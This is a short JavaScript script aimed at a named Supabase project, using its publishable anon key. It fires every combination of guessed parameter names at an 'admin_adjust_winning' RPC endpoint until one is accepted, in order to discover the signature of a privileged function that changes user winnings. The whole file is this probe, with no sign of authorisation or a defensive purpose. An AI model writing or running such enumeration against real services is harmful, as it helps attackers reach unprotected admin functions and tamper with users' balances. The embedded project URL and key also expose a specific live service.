const SUPABASE_URL = 'https://phuduaampsjenkreufmz.supabase.co';
const SUPABASE_ANON_KEY = 'sb_publishable_Y6DY8s-Cph3gIbEMRqWNLg_fodyJPrj';

const users = ['p_user_id', 'user_id', 'userId', 'uid', 'p_uid', 'uuid', 'id', 'p_id', 'p_userid', 'user', 'userid', 'player_id', 'p_player_id', 'account_id', 'p_account_id'];
const amounts = ['p_amount', 'amount', 'amt', 'p_amt', 'numeric', 'delta', 'p_delta', 'value', 'p_value'];
const texts = ['p_description', 'description', 'p_note', 'note', 'p_admin_note', 'admin_note', 'p_notes', 'notes', 'text', 'reason', 'p_reason', 'message', 'p_message', 'desc', 'p_desc'];

async function run() {
  const promises = [];
  for (let u of users) {
    for (let a of amounts) {
      for (let t of texts) {
        const body = {};
        body[u] = '00000000-0000-0000-0000-000000000000';
        body[a] = 10;
        body[t] = 'test';
        
        promises.push(
          fetch(SUPABASE_URL + '/rest/v1/rpc/admin_adjust_winning', {
            method: 'POST',
            headers: {
              'apikey': SUPABASE_ANON_KEY,
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(body)
          }).then(res => res.json()).then(data => {
            if (data.code !== 'PGRST202') {
              console.log(`FOUND: ${u}, ${a}, ${t}`);
              console.log(data);
              process.exit(0);
            }
          })
        );
      }
    }
  }
  await Promise.all(promises);
  console.log("Not found.");
}
run();
